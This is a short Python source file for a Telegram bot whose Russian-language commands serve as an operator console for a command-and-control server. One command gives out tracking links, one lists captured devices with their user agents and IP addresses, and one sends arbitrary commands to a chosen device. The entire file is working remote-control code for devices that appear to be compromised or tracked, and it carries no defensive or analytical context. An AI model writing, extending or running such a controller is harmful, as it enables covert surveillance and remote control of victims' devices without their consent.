import os, asyncio, aiohttp
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message

BOT_TOKEN = os.environ["BOT_TOKEN"]
C2 = os.environ.get("C2_URL", "http://127.0.0.1:8080")
bot = Bot(BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(m: Message):
    await m.answer(f"Ссылка: {C2}/t?u={m.from_user.id}")

@dp.message(Command("list"))
async def lst(m: Message):
    async with aiohttp.ClientSession() as s:
        async with s.get(f"{C2}/api/devices") as r:
            data = await r.json()
    if not data:
        await m.answer("пусто")
    else:
        await m.answer("\n".join(f'{d[0]} | {d[1]["ua"][:40]} | {d[1]["ip"]}' for d in data))

@dp.message(Command("cmd"))
async def cmd(m: Message):
    parts = m.text.split(maxsplit=2)
    if len(parts) < 3:
        await m.answer("формат: /cmd ID действие")
        return
    async with aiohttp.ClientSession() as s:
        async with s.post(f"{C2}/api/cmd", json={"id": parts[1], "action": parts[2]}) as r:
            await m.answer(await r.text())

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
